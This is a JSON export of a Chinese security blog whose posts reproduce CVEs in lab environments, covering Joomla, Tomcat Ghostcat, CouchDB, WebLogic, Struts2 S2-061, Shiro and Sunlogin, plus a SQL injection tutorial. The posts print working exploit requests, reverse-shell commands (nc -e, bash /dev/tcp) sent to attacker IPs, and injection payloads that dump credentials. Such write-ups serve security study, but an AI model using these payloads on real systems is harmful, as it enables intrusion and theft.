{"meta":{"title":"GhostToKnow","subtitle":"","description":"","author":"GhostToKnow","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"Joomla 未授权访问漏洞POC CVE-2023-23752","slug":"Joomla-未授权访问漏洞POC-CVE-2023-23752","date":"2023-04-02T13:03:46.000Z","updated":"2023-04-02T13:13:21.711Z","comments":true,"path":"2023/04/02/Joomla-未授权访问漏洞POC-CVE-2023-23752/","link":"","permalink":"http://example.com/2023/04/02/Joomla-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9EPOC-CVE-2023-23752/","excerpt":"","text":"前言Joomla是一套全球知名的内容管理系统（CMS），其使用PHP语言加上MySQL数据库所开发，可以在Linux、Windows、MacOSX等各种不同的平台上运行。 2月16日，Joomla官方发布安全公告，修复了Joomla! CMS中的一个未授权访问漏洞（CVE-2023-23752），目前该漏洞的细节及PoC&#x2F;EXP已公开。 Joomla! CMS 版本4.0.0 - 4.2.7中由于对web 服务端点访问限制不当，可能导致未授权访问Rest API，造成敏感信息泄露（如数据库账号密码等）。 影响版本Joomla! CMS 版本4.0.0 - 4.2.7 pocPOC获取：https://github.com/GhostToKnow/CVE-2023-23752 自己写了个poc测试了下，1k条数据40s左右扫描完毕，结果正确率在90%以上 linux: ![image-20230309135227943](C:\\Users\\dong\\Desktop\\Books\\CVE\\Joomla CVE-2023-23752\\Snipaste_2023-04-02_21-05-21.png) win: ![image-20230309135344844](C:\\Users\\dong\\Desktop\\Books\\CVE\\Joomla CVE-2023-23752\\Snipaste_2023-04-02_21-05-41.png) ![image-20230309135128326](C:\\Users\\dong\\Desktop\\Books\\CVE\\Joomla CVE-2023-23752\\Snipaste_2023-04-02_21-05-58.png) 修复建议目前该漏洞已经修复，受影响用户可及时升级到Joomla! CMS 版本4.2.8。","categories":[{"name":"POC","slug":"POC","permalink":"http://example.com/categories/POC/"}],"tags":[{"name":"Joomla","slug":"Joomla","permalink":"http://example.com/tags/Joomla/"}]},{"title":"Tomcat 幽灵猫任意文件读取漏洞复现 CVE-2020-1938","slug":"Tomcat-幽灵猫任意文件读取漏洞复现-CVE-2020-1938","date":"2023-04-02T12:53:03.000Z","updated":"2023-04-02T12:55:44.218Z","comments":true,"path":"2023/04/02/Tomcat-幽灵猫任意文件读取漏洞复现-CVE-2020-1938/","link":"","permalink":"http://example.com/2023/04/02/Tomcat-%E5%B9%BD%E7%81%B5%E7%8C%AB%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-1938/","excerpt":"","text":"Tomcat 任意文件读取漏洞复现 CVE-2020-1938漏洞介绍1231. Java是目前Web开发中最主流的编程语言，而 Tomcat 是当前最流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。2. CVE-2020-1938是由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。3. 这个漏洞影响全版本默认配置下的 Tomcat（在我们发现此漏洞的时候，确认其影响 Tomcat 9/8/7/6 全版本，而年代过于久远的更早的版本未进行验证），这意味着它在 Tomcat 里已经潜伏了长达十多年的时间。 影响版本 Apache Tomcat &#x3D; 6 7 &lt;&#x3D; Apache Tomcat &lt; 7.0.100 8 &lt;&#x3D; Apache Tomcat &lt; 8.5.51 9 &lt;&#x3D; Apache Tomcat &lt; 9.0.31 漏洞复现创建文件夹 1mkdir tomcat-ghostcat 进入创建好的文件夹 1cd tomcat-ghostcat 拉取靶场启动脚本 1wget repo.vulab.io/tomcat/CVE-2020-1938/1.0.1 -O tomcat-ghostcat 启动漏洞docker容器 1sudo docker-compose -f tomcat-ghostcat up 在本机访问192.168.52.130访问开启的web服务，这里我配置了hosts 可以看到CVE-2020-1938已经成功载入，使用namp扫描一下端口 1sudo nmap -v -sS -p1-9000 -Pn -T4 -A 192.168.52.130 --script http-methods --script-args Gecko/20100101 Firefox/87.0&quot; 发现服务器开启了8009端口，ajp协议端口就是8009端口，可能存在ajp协议，使用xray工具扫描下端口 1xray_windows_386.exe servicescan --target 192.168.52.130:8009 爆出了存在幽灵猫漏洞的CVE-2022-1938漏洞，使用相关poc测试发现成功拉取到文件 漏洞修复更新tomcat版本，将tomcat升级到9.0.31、8.5.51或者7.0.100版本 禁止使用AJP协议 配置secret和secretRequired来设置AJP协议的认证凭证 参考xray 1https://www.chaitin.cn/en/ghostcat#download CNVD-2020-10487-Tomcat-Ajp-lfi 1https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"Tomcat","slug":"Tomcat","permalink":"http://example.com/tags/Tomcat/"}]},{"title":"CouchDB 垂直权限绕过任意命令执行漏洞复现 CVE-2017-12635/6","slug":"CouchDB-垂直权限绕过任意命令执行漏洞复现-CVE-2017-12635-6","date":"2023-04-02T12:34:42.000Z","updated":"2023-04-02T12:43:57.381Z","comments":true,"path":"2023/04/02/CouchDB-垂直权限绕过任意命令执行漏洞复现-CVE-2017-12635-6/","link":"","permalink":"http://example.com/2023/04/02/CouchDB-%E5%9E%82%E7%9B%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2017-12635-6/","excerpt":"","text":"前言CouchDB 是一个开源的面向文档的数据库管理系统，可以通过 RESTful JavaScript Object Notation (JSON) API 访问。CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。 CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行。 影响版本： ​ 小于 1.7.0 以及小于 2.1.1 漏洞复现环境搭建使用Vulhub的漏洞平台进行复现 docker-compose up -d 访问http://192.168.52.128:5984/_utils/#login出现如下页面搭建成功 测试过程CVE-2017-12635构造创建账户的PUT包 123456789101112131415PUT /_users/org.couchdb.user:GhostToKnow HTTP/1.1Host: www.0-sec.org:5984Accept: /Accept-Language: enUser-Agent: Connection: closeContent-Type: application/jsonContent-Length: 104 &#123; &quot;type&quot;: &quot;user&quot;, &quot;name&quot;: &quot;GhostToKnow&quot;, &quot;roles&quot;: [&quot;_admin&quot;], &quot;password&quot;: &quot;GhostToKnow&quot; &#125; 我们没有admin权限，所以报错forbidden显示只有管理员才能设置Role角色。 绕过role验证：发送包含两个roles的数据包，即可绕过限制 在原先的包中加入 “roles”:[], 12345678910111213141516PUT /_users/org.couchdb.user:GhostToKnow HTTP/1.1Host: www.0-sec.org:5984Accept: /Accept-Language: enUser-Agent: Connection: closeContent-Type: application/jsonContent-Length: 104 &#123; &quot;type&quot;: &quot;user&quot;, &quot;name&quot;: &quot;GhostToKnow&quot;, &quot;roles&quot;: [&quot;_admin&quot;], &quot;roles&quot;: [], &quot;password&quot;: &quot;GhostToKnow&quot; &#125; 返回”ok”:true即成功创建用户 尝试使用GhostToKnow&#x2F;GhostToKnow登录： 成功登录，且为管理员账户 CVE-2017-12636该漏洞利用条件需要登录管理员用户触发，可使用上面介绍的CVE-2017-12635搭配利用 由于Couchdb 2.x和和1.x的的API接口有所差别，导致利用方式也不同，这里直接拿刚刚复现的CVE-2017-12635环境，演示2.x版本 Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name,带上账号密码访问/_membership获取node名称： 其中GhostToKnow:GhostToKnow为管理员的账户密码 curl http://GhostToKnow:GhostToKnow@192.168.52.128:5984/_membership 这里只有一个node，为：nonode@nohost 修改nonode@nohost的配置,其中id &gt;/tmp/success是要执行的命令，可以更换为弹shell 1curl -X PUT http://GhostToKnow:GhostToKnow@192.168.52.128:5984/_node/nonode@nohost/_config/query_servers/cmd -d &#x27;&quot;id &gt;/tmp/success&quot;&#x27; 请求添加一个名为ccc的Database，以便在里面执行查询 curl -X PUT &#39;http://GhostToKnow:GhostToKnow@192.168.52.128:5984/ccc&#39; 请求添加一个名为test的Document，以便在里面执行查询 curl -X PUT &#39;http://GhostToKnow:GhostToKnow@192.168.52.128:5984/ccc/test&#39; -d &#39;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39; Couchdb 2.x删除了_temp_view，所以我们为了触发query_servers中定义的命令，需要添加一个_view： curl -X PUT http://GhostToKnow:GhostToKnow@192.168.52.128:5984/ccc/_design/test -d &#39;&#123;&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&#39; -H &quot;Content-Type: application/json&quot; 增加_view的同时即触发了query_servers中的命令。 看到返回错误信息没有关系，报错来源于执行命令之后的流程 加入靶机的docker查看发现命令执行成功，成功写入success文件 1.6.0系列 curl -X PUT &#39;http://GhostToKnow:GhostToKnow@192.168.52.128:5984/_config/query_servers/cmd&#39; -d &#39;&quot;id &gt;/tmp/success&quot;&#39; curl -X PUT &#39;http://GhostToKnow:GhostToKnow@192.168.52.128:5984/ccc&#39; curl -X PUT &#39;http://GhostToKnow:GhostToKnow@192.168.52.128:5984/ccc/test&#39; -d &#39;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39; curl -X POST &#39;http://GhostToKnow:GhostToKnow@192.168.52.128:5984/ccc/_temp_view?limit=10&#39; -d &#39;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#39; -H &#39;Content-Type:application/json&#39; exp要替换对应的网址，端口，监听ip，对应版本，1.x和2.x的payload不一致。 python3 exp.py","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"CouchDB","slug":"CouchDB","permalink":"http://example.com/tags/CouchDB/"}]},{"title":"Weblogic CVE-2020-2551","slug":"Weblogic-CVE-2020-2551","date":"2023-04-02T12:10:38.000Z","updated":"2023-04-02T13:14:33.688Z","comments":true,"path":"2023/04/02/Weblogic-CVE-2020-2551/","link":"","permalink":"http://example.com/2023/04/02/Weblogic-CVE-2020-2551/","excerpt":"","text":"前言2020年1月15日,Oracle发布了一系列的安全补丁,其中Oracle WebLogic Server产品有高危漏洞,漏洞编号CVE-2020-2551,CVSS评分9.8分,漏洞利用难度低,可基于IIOP协议执行远程代码。 经过分析这次漏洞主要原因是错误的过滤JtaTransactionManager类，JtaTransactionManager父类AbstractPlatformTransactionManager在之前的补丁里面就加入到黑名单列表了,T3协议使用的是resolveClass方法去过滤的,resolveClass方法是会读取父类的,所以T3协议这样过滤是没问题的。但是IIOP协议这块,虽然也是使用的这个黑名单列表,但不是使用resolveClass方法去判断的,这样默认只会判断本类的类名,而JtaTransactionManager类是不在黑名单列表里面的,它的父类才在黑名单列表里面,这样就可以反序列化JtaTransactionManager类了,而JtaTransactionManager类是存在jndi注入的。 环境搭建直接使用vulhub中的CVE-2017-10271就可以 使用git克隆到本地 1git clone https://github.com/vulhub/vulhub.git 进入对应环境 1cd vulhub/weblogic/CVE-2017-10271 启动docker漏洞环境 1sudo docker-compose up -d 搭建完成以后，访问7001&#x2F;console如下图所示即为搭建成功 检测是否存在漏洞python3 CVE-2020-2551.py -u http://192.168.52.128:7001/ 发现存在漏洞 漏洞利用攻击机ip：192.168.0.101 靶机ip：192.168.52.128 攻击机开启监听nc -lvnp 3333 编写一个exp.java文件： 12345678910111213import java.io.IOException;public class exp &#123; static&#123; try &#123; java.lang.Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;nc -e /bin/bash 192.168.0.101 3333&quot;&#125;); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; public static void main(String[] args) &#123; &#125;&#125; 其中”nc -e &#x2F;bin&#x2F;bash 192.168.52.130 3333”是要执行的命令 然后进行编译，生成出一个exp.class文件 启一个web服务，需要与exp.class在同一文件夹 使用marshalsec起一个恶意的RMI服务 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.0.101/#exp&quot; 1099 然后开始进行攻击，使用命令,成功弹出shell： 1java -jar weblogic_CVE_2020_2551.jar 192.168.52.128 7001 rmi://192.168.0.101:1099/exp","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"Weblogic","slug":"Weblogic","permalink":"http://example.com/tags/Weblogic/"}]},{"title":"Struts2 S2-061 远程命令执行漏洞（CVE-2020-17530）复现","slug":"Struts2-S2-061-远程命令执行漏洞（CVE-2020-17530）复现","date":"2023-03-29T13:21:36.000Z","updated":"2023-03-29T13:32:08.442Z","comments":true,"path":"2023/03/29/Struts2-S2-061-远程命令执行漏洞（CVE-2020-17530）复现/","link":"","permalink":"http://example.com/2023/03/29/Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-17530%EF%BC%89%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"前言Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架。Apache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞(CVE-2020-17530)，在使用某些tag等情况下可能存在OGNL表达式注入漏洞，从而造成远程代码执行，风险极大，S2-061是对S2-059漏洞修复后的绕过。 影响版本： Apache Struts 2.0.0 - 2.5.25 环境搭建这里使用vulhub漏洞环境搭建 使用git克隆到本地 git clone https://github.com/vulhub/vulhub.git 进入对应环境 cd vulhub/struts2/s2-061 启动docker漏洞环境 sudo docker-compose up -d 访问对应地址，出现如下页面，环境搭建成功 复现过程实现判断下是否存在漏洞，使用?id&#x3D;%25{7*7}查看返回id的值是7*7还是49，如果是47那么就说明进行了二次表达式解析，存在改漏洞 这里id为49说明存在该漏洞。抓包修改为以下，这里的#arglist.add(&quot;xx&quot;)函数这里包含的值是你要执行的命令 123456789101112131415161718POST /.action HTTP/1.1Host: 192.168.52.128:8080User-Agent: xxxAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: JSESSIONID=node0i3sptalo62q6kw46qu49oxwn1.node0Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwFContent-Length: 833------WebKitFormBoundaryl7d1B1aGsV2wcZwFContent-Disposition: form-data; name=&quot;id&quot;%&#123;(#instancemanager=#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack=#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean=#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context=#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc=#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist=#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;ls&quot;)).(#execute=#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))&#125;------WebKitFormBoundaryl7d1B1aGsV2wcZwF-- 已经可以执行我们的命令了，接下来反弹shell 在vps上监听3333端口：nc -lvnp 3333 编写反弹shell代码 bash -i &gt;&amp; /dev/tcp/192.168.52.130/3333 0&gt;&amp;1 反弹shell涉及到管道符问题要将命令进行base64编码 bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjEzMC8zMzMzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; 成功反弹出shell 检查POC 1234567891011121314151617181920212223242526272829303132333435import requestsimport argparseimport osdef url(): parser = argparse.ArgumentParser(description=&#x27;S2-061 CVE-2020-17530&#x27;) parser.add_argument(&#x27;target_url&#x27;,type=str,help=&#x27;The target address,example: http://192.168.52.128:8080&#x27;) args = parser.parse_args() global url url = args.target_url if url.startswith(&#x27;http://&#x27;) or url.startswith(&#x27;https://&#x27;): pass else: print(&#x27;请使用http://或者https://&#x27;) os._exit(0) if url.endswith(&#x27;/&#x27;): url = url[:-1] print(&quot;开始测试&quot;) return urldef poc(): headers=&#123; &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100102 Firefox/107.0&#x27; &#125; vul_url = url + &#x27;/?id=%25&#123;7*7&#125;&#x27; try: text = requests.get(vul_url,headers=headers,timeout=10).text if &#x27;49&#x27; in text: print(&#x27;[漏洞存在]&#x27;) else: print(&#x27;[漏洞不存在]&#x27;) except: print(&#x27;[发生错误]&#x27;)if __name__ == &#x27;__main__&#x27;: url() poc() 修复建议升级到 Struts 2.5.26 版本或更高版本","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"Struts2","slug":"Struts2","permalink":"http://example.com/tags/Struts2/"}]},{"title":"Shiro 身份认证绕过漏洞 CVE-2022-32532","slug":"Shiro-身份认证绕过漏洞-CVE-2022-32532","date":"2023-03-29T13:16:44.000Z","updated":"2023-03-29T13:19:53.225Z","comments":true,"path":"2023/03/29/Shiro-身份认证绕过漏洞-CVE-2022-32532/","link":"","permalink":"http://example.com/2023/03/29/Shiro-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2022-32532/","excerpt":"","text":"前言123Apache Shiro 是一个强大且易用的 Java 安全框架，通过它可以执行身份验证、授权、密码和会话管理。使用 Shiro 的易用 API，您可以快速、轻松地保护任何应用程序 —— 从最小的移动应用程序到最大的 WEB 和企业应用程序。2022年6月29日，Apache官方披露Apache Shiro权限绕过漏洞(CVE-2022-32532)，当Apache Shiro中使用RegexRequestMatcher进行权限配置，且正则表达式中携带&quot;.&quot;时，未经授权的远程攻击者可通过构造恶意数据包绕过身份认证，导致配置的权限验证失效。 影响版本Apache Shiro &lt; 1.9.1 漏洞原理123根据java正则表达式的特点，在正则表达式中元字符.是匹配除换行符之外的任何单个字符。新增Pattern.DOTALL模式后，正则表达式.就可以匹配任何字符包括换行符。在shiro-core-1.9.0.jar中存在一个RegExPatternMatcher类，提供请求路径匹配功能及拦截器参数解析的功能。这个类的Pattern存在带.的正则表达式匹配，如果存在/n或/r字符时，就会判断错误。 环境搭建直接使用vulfocus的镜像环境 启动靶场后直接访问给的地址就行 复现过程测试直接访问敏感地址访问被拒绝 我们抓一下get包，放在Repeater模块 使用%0a进行权限绕过%0a是换行符 访问成功返回success 修复建议建议尽快升级至Apache Shiro 1.9.1及以上版本","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"Shiro","slug":"Shiro","permalink":"http://example.com/tags/Shiro/"}]},{"title":"CNVD-2022-10270/03672 向日葵RCE复现","slug":"CNVD-2022-10270-03672-向日葵RCE复现","date":"2023-03-29T13:05:36.000Z","updated":"2023-03-29T13:20:12.997Z","comments":true,"path":"2023/03/29/CNVD-2022-10270-03672-向日葵RCE复现/","link":"","permalink":"http://example.com/2023/03/29/CNVD-2022-10270-03672-%E5%90%91%E6%97%A5%E8%91%B5RCE%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"前言向日葵是一款免费的集远程控制电脑手机、远程桌面连接、远程开机、远程管理、支持内网穿透的一体化远程控制管理工具软件。 于2022年2月5日和2022年2月15日，CNVD公开上海贝锐信息科技股份有限公司的向日葵远控软件存在远程代码执行漏洞（CNVD-2022-10270&#x2F;CNVD-2022-03672），影响Windows系统使用的个人版和简约版，攻击者可利用该漏洞获取服务器控制权。 影响版本12向日葵个人版 for Windows &lt;= 11.0.0.33向日葵简约版 &lt;= V1.0.1.43315（2021.12） 漏洞级别高危 环境搭建在虚拟机里安装11.0.0.33的低版本向日葵 漏洞复现使用nmap或其他工具探测目标端口 在浏览器中访问ip+端口号+cgi-bin&#x2F;rpc?action&#x3D;verify-haras （端口号：每一个都尝试，直到获取到session值CID） Cookies添加拿到的CID后加上payload请求 http://192.168.52.133:49437/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+ whoami 手动复现完成 工具使用使用工具自带的扫描 xrkRce.exe -h ip -t scan 测试命令执行 批量检测python3 sunlogin-fuzz.py -t 192.168.52.128/25","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"向日葵","slug":"向日葵","permalink":"http://example.com/tags/%E5%90%91%E6%97%A5%E8%91%B5/"}]},{"title":"常见sql注入手法总结与技巧(一)","slug":"常见sql注入手法总结与技巧-一","date":"2023-03-24T11:48:48.000Z","updated":"2023-03-29T13:20:40.806Z","comments":true,"path":"2023/03/24/常见sql注入手法总结与技巧-一/","link":"","permalink":"http://example.com/2023/03/24/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93%E4%B8%8E%E6%8A%80%E5%B7%A7-%E4%B8%80/","excerpt":"","text":"前言SQL 是 Structured Query Language 的缩写，中文译为“结构化查询语言”。SQL 是一种计算机语言，用来存储、检索和修改关系型数据库中存储的数据。 sql注入是最为常见也是破坏力很大的漏洞，它是因为开发在开发时没有对用户的输入行为进行判断和过滤，使得用户输入了恶意语句后传给了后端数据库进行相应的动作（如增删改查甚至写后门）。 根本产生原因：后端服务器接收传来的参数未经过严格过滤判断而直接进入数据库查询 所以在学习SQL注入前需要了解SQL基础语法 SQL注入根源分析如果后台sql语句为： 1$sql=&quot;SELECT * FROM users WHERE id=&#x27; $id &#x27; LIMIT 0,1&quot;; 如果我们传入id&#x3D;1’ 那么如果后端没有经过过滤而是直接把我们传入的参数带进sql语句中，那么sql语句就会变成： 1$sql=&quot;SELECT * FROM users WHERE id=&#x27;1&#x27;&#x27; LIMIT 0,1&quot;; 我们传入的 ‘ 就会一块带入和前面的单引号进行闭合，导致原来后面的单引号就多余，而sql语句引号是必须成对出现的就会报错什么都查不出来，但如果我们在1’后面加入恶意语句并且把后面的原来的语句进行注解，就会造成sql语句会执行我们传入的恶意语句，实现注入。 12id = -1&#x27; union select database() #$sql=&quot;SELECT * FROM users WHERE id=&#x27;-1&#x27; union select database() #&#x27; LIMIT 0,1&quot;; -1表示查询一个不存在的id，是为了不影响后面我们的注入语句 #,–+,– 表示注释，把后面所有语句注释掉，这样就不会影响我们的注入语句 sql参数类型分类SQL注入按照参数类型分类可分为两种：数字型和字符型 数字型：select * from table where id&#x3D;2 字符型：select * from table where id&#x3D;’2’ 区别在于数字型不需要单引号进行闭合，而字符型一般需要通过单引号闭合。 判断类型方法： ​ 构造payload为：id=1 order by 9999 --+ 如果正确返回页面，则为字符型；否则，为数字型 ​ 构造payload为：1 and 1=2 如果正确返回页面，则为字符型；否则，为数字型 常见sql注入手法这里先给出常用的payload，后面会使用到 1234567select database()select group_concat(table_name)from information_schema.tables where table_schema=database()select group_concat(column_name)from information_schema.columns where table_name=&#x27;xxxx&#x27;select group_concat(字段名) from 表名 常见注入手法分类布尔盲注 时间盲注 union联合注入 报错注入 堆叠注入 二次注入 宽字节注入 通过sql注入写webshell 通过http header注入 … 盲注通常根据SQL注入是否有回显将其分为有回显的注入和无回显的注入，其中无回显的注入就是盲注。 我们的注入语句可能会让网页呈现两种状态，例如“查询成功”，“查询失败”，相当于true和false。也可能是一句“查询完成”或者什么都不说。虽然并不能直接得到数据库中的具体数据，但是SQL语句的拼接已经发生了，非法的SQL也执行了，SQL注入攻击就发生了，只是SQL注入的结果不能直接拿到。 盲注就是针对这种无回显的情况，盲注就像是爆破，在进行SQL盲注时，大致过程为： 12345678如果&quot;数据库XX&quot;的第一个字母是a，就返回“查询成功”，否则返回“查询失败”如果&quot;数据库XX&quot;的第一个字母是b，就返回“查询成功”，否则返回“查询失败”如果&quot;数据库XX&quot;的第一个字母是c，就返回“查询成功”，否则返回“查询失败”...如果&quot;数据库XX&quot;的第二个字母是a，就返回“查询成功”，否则返回“查询失败”如果&quot;数据库XX&quot;的第二个字母是b，就返回“查询成功”，否则返回“查询失败”如果&quot;数据库XX&quot;的第二个字母是c，就返回“查询成功”，否则返回“查询失败”... 通过这样不断的测试爆破，根据回显的“查询成功”和“查询失败”，判断出具体数据的每一位是什么，就可以完整的得到这个数据的具体值了。 布尔盲注下面使用sqli-labs靶场演示,less-8关 查询成功返回You are in…. 而查询失败则什么都不显示 返回You are in….相当于是“查询成功”，而什么都没显示则相当于是“查询失败”。所以我们构造的判断语句，可以根据页面是否有You are in….来充当判断条件。 要使用的sql函数： substr(要截取的字符串，从哪一位开始截取，截取多长) ascii()返回传入字符串的首字母的ASCII码 获取当前数据库名 12345678910111213141.判断当前数据库名的长度id=1&#x27; and length(database())=8 --+ //有回显判断到等于8时出现You are in....说明语句执行正确，当前数据库长度为8个字符2.判断当前数据库名//判断数据库的第一个字符id=1&#x27; and ascii(substr(database(),1,1))=115 --+//判断数据库的第二个字符id=1&#x27; and ascii(substr(database(),2,1))=101 --+//判断数据库的第三个字符id=1&#x27; and ascii(substr(database(),3,1))=99 --+...数据库为 security 获取当前库的表名 123456789判断每个表名的每个字符的ascii值//判断第一个表的第一个字符id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+//判断第一个表的第二个字符id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109 --+...判断出存在表 emails、referers、uagents、users 获取表的字段 123456789猜测users表比较重要，先查询users表//判断第一个字段的第一个字符id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=117 --+//判断第一个字段的第二个字符id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),2,1))=115 --+...users表中存在 id、username、password 字段 获取字段中的数据 12345//判断id字段的第一行数据的第一个字符id=1&#x27; and ascii(substr((select id from users limit 0,1),1,1))=100 --+//判断id字段的第二行数据的第二个字符id=1&#x27; and ascii(substr((select id from users limit 0,1),2,1))=100 --+... 手工去盲注太过繁琐，不建议手工注入，可借助工具或者写脚本跑 时间盲注时间盲注也叫延迟注入。在页面没有回显数据，也没有可以充当判断条件的地方，也没有报错信息，就可以考虑尝试时间盲注。时间盲注就是将页面的反响时间作为判断依据，来注入出数据库的信息。 以Less-9为例，当我们以id&#x3D;1’ and sleep(5) –+ 进行注入，可以明显的感觉到页面返回响应的时间变长了，大概拉长了5秒左右，这说明构造的sleep(5)语句起作用了。我们可以把这个当作判断依据，配合if语句使用。 if(a,b,c) 如果a的值为true，则返回b的值，如果a的值为false，则返回c的值。 获取数据库名 123456//查询数据库名第一个字符id=1&#x27; and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+明显感受到页面延迟了几秒，说明数据库名字第一个字符是s。//查询数据库名第二个字符id=1&#x27; and if(ascii(substr(database(),2,1))= 101,sleep(5),0) --+... 与盲注类似，后面就是爆破字符，再爆表名，字段名，具体数据。 不建议手注，建议编写脚本或使用工具 union联合注入第一步，测试注入点，一些小技巧：利用引号，and 1&#x3D;1 ，or 1&#x3D;1 等判断是字符型还是数字型 正常返回判断是字符型 第二步，利用order by 查表得到到字段个数 查到3时正常返回但到4时报错说明当前表中只有三列 第三步，利用union select 1,2,3..判断回显位，如果有回显，找到回显位，回显位也就是回显页面有我们设置的1,2,3的位置 发现者里有2和3的回显位,在name和Password回显 第四步，爆库，爆表，爆字段名，爆值 为什么用-1 ：因为-1大概率会返回空表，union select联合查询会返回一张表，就只会显示后面联合查询表 组合使用上面提到的常用的payload，放在页面回显位上 -1&#39; union select 1,(select database()),3 --+ -1&#39; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=database()),3 --+ 爆出4个表，选择爆users表 -1&#39; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#39;users&#39;),3 --+ 发现查询出了很多字段应该爆错了不是我们需要的那个表，可能其他库里也有users表，这样要加一条限制语句，查security库里的users表 -1&#39; union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),3 --+ 爆字段的数据 -1&#39; union select 1,(select group_concat(id,username,password) from users),3 --+ 12345-1&#x27; union select 1,(select database()),3 --+-1&#x27; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=database()),3 